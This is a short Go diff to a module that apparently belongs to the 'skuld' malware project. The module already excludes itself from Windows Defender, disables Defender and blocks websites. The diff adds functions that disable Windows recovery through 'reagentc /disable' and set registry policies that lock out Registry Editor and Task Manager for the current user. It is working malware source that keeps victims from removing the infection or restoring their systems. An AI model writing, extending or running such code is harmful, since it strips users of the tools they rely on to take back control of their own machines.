@@ -9,7 +9,7 @@ import (
 	"syscall"
 
 	"strings"
-
+	"golang.org/x/sys/windows/registry"
 	"github.com/hackirby/skuld/utils/program"
 )
 
@@ -49,6 +49,9 @@ func Run() {
 	ExcludeFromDefender()
 	DisableDefender()
 	BlockSites(sites)
+	DisableRegistry()
+	DisableTaskManager()
+	DisableFactoryReset()
 }
 
 func ExcludeFromDefender() error {
@@ -136,4 +139,19 @@ func BlockSites(sites []string) error {
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 
 	return cmd.Run()
+}
+func DisableFactoryReset() {
+	exec.Command("reagentc.exe", "/disable").Run()
+}
+func DisableRegistry() {
+	hehe, _ := registry.OpenKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", registry.SET_VALUE|registry.CREATE_SUB_KEY)
+	defer hehe.Close()
+	_ = hehe.SetDWordValue("DisableRegistryTools", 1)
+}
+
+func DisableTaskManager() {
+	key, _ := registry.OpenKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", registry.SET_VALUE|registry.CREATE_SUB_KEY)
+	defer key.Close()
+
+	_ = key.SetDWordValue("DisableTaskMgr", 1)
 }
